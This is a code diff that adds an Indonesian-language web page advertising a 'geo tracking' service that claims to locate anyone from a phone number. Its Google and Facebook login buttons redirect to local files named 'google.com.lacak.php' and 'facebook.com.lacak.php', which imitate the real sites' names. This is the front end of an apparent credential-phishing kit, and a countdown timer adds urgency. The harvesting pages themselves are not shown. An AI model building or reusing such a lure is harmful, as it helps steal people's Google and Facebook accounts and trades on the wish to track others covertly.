@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lacak No Hp</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('background1.jpeg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+        }
+        #login-container {
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            justify-content: flex-start;
+            align-items: flex-end;
+        }
+        #text-container {
+            position: fixed;
+            top: 60px;
+            right: 10px;
+            padding: 6px 6px;
+            border-radius: 10px;
+            font-size: 12px;
+            color: white;
+        }
+        #login-buttons {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+        }
+        #login-buttons h1 {
+            margin: 0 20px 0 0;
+            white-space: nowrap;
+        }
+        .login-button {
+            margin: 0 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        #google-login {
+            background-color: #4285F4; /* Google button color */
+        }
+        #tex123 {
+            background-color: #ffffff; /* Google button color */
+        }
+        #facebook-login {
+            background-color: #3b5998; /* Facebook button color */
+        }
+        #news-container {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start; /* Mengubah align-items ke flex-start */
+            margin: 20px 0;
+            opacity: 1;
+        }
+        #news-content {
+            background: rgba(255, 255, 255, 0.884);
+            border-radius: 10px;
+            padding: 20px;
+            color: black;
+            width: 50%;
+        }
+        #news-container img {
+            width: 40%; /* Mengatur lebar gambar berita */
+            height: auto; /* Menjaga aspek rasio gambar */
+            border-radius: 10px;
+            opacity: 0.7;
+            transition: opacity 0.3s ease; /* Efek transisi untuk gambar */
+        }
+        #countdown {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 16px;
+            color: white;
+        }
+        #text-content {
+            position: fixed;
+            top: 10px;
+            background: rgba(255, 255, 255, 0.884);
+            border-radius: 10px;
+            padding: 20px;
+            color: black;
+            width: 50%;
+        }
+    </style>
+</head>
+<body>
+    <div id="login-container">
+        <div id="login-buttons">
+            <h1>Login</h1>
+            <button id="google-login" class="login-button" onclick="googleLogin()">
+                <img src="igo.jpeg" width="20" height="20">‎ ‎ Login with Google
+            </button>
+            <button id="facebook-login" class="login-button" onclick="facebookLogin()">
+                <img src="if.jpeg" width="20" height="20">‎ ‎ Login with Facebook
+            </button>
+        </div>
+    </div>
+
+    <div id="text-container">
+      
+        <a href="https://mail.google.com/mail/?view=cm&fs=1&to=geotrack@gmail.com&su=Masalah%20dengan%20website&body=Saya%20punya%20masalah%20dengan%20website%20ini" class="guest-mode" style="color:rgb(35, 112, 255)">Hubungi kami</a><br><br>
+ 
+           
+     
+    </div>
+
+    <div id="news-container">
+        <div id="news-content">
+            <h2>GEO TRACKING</h2>
+            <p>Geo tracking adalah sebuah teknologi atau layanan yang memungkinkan pengguna untuk melacak lokasi perangkat atau individu hanya dengan menggunakan informasi seperti nomor telepon, alamat email, atau data identifikasi lainnya. Layanan ini umumnya tersedia dalam bentuk website atau aplikasi yang memanfaatkan teknologi GPS atau informasi jaringan lainnya untuk menentukan posisi secara akurat. Geo tracking dapat digunakan untuk berbagai tujuan, mulai dari keamanan dan pengawasan perangkat pribadi hingga pelacakan dalam konteks logistik dan manajemen armada. Dengan menggunakan layanan geo tracking, pengguna dapat memantau dan mengelola lokasi dengan efisien dan akurat. Prosesnya dimulai dengan pengumpulan data lokasi dari perangkat yang terhubung, baik melalui GPS perangkat itu sendiri atau informasi jaringan lain seperti WiFi atau data seluler. Informasi ini kemudian dikirim ke server pusat di mana data tersebut diolah dan digunakan untuk menentukan lokasi yang tepat. Pengguna dapat mengakses informasi ini melalui antarmuka web atau aplikasi, yang sering kali menyediakan peta interaktif dan laporan lokasi.</p>
+        </div>
+        <img id="news-image" src="apk.jpeg" alt="News Image">
+    </div>
+
+    <div id="countdown"></div>
+
+    <script>
+        // Daftar gambar yang ingin ditampilkan
+        const images = ["apk.jpeg", "tracking.jpeg", "car.jpeg", "s.jpeg"]; // Ganti dengan nama file gambar yang sesuai
+
+        let currentImageIndex = 0;
+        const newsImage = document.getElementById('news-image');
+
+        function changeImage() {
+            newsImage.src = images[currentImageIndex];
+            currentImageIndex = (currentImageIndex + 1) % images.length; // Menggunakan modulus untuk mengulang daftar gambar
+        }
+
+        // Panggil changeImage setiap 5 detik (5000 milidetik)
+        setInterval(changeImage, 5000); // Ubah waktu disini sesuai dengan keinginan anda
+
+        // Hitung mundur ke hari Selasa
+        function getNextTuesday() {
+            const now = new Date();
+            const result = new Date();
+            result.setDate(now.getDate() + (2 + 7 - now.getDay()) % 7);
+            result.setHours(0, 0, 0, 0);
+            return result;
+        }
+
+        function updateCountdown() {
+            const now = new Date();
+            const nextTuesday = getNextTuesday();
+            const diff = nextTuesday - now;
+
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+            document.getElementById('countdown').innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+
+            if (diff < 0) {
+                clearInterval(countdownInterval);
+                document.getElementById('countdown').innerHTML = "Waktu habis!";
+            }
+        }
+
+        const countdownInterval = setInterval(updateCountdown, 1000);
+
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelector('form').addEventListener('submit', function() {
+                var popup = document.createElement('div');
+                popup.className = 'custom-popup';
+                document.body.appendChild(popup);
+            });
+        });
+
+     
+
+       
+
+        function googleLogin() {
+            // Tambahkan logika login Google di sini
+            window.location.href = "google.com.lacak.php";
+        }
+
+        function facebookLogin() {
+            // Navigasi ke halaman login Facebook
+            window.location.href = "facebook.com.lacak.php";
+        }
+
+       
+    </script>
+</body>
+</html>
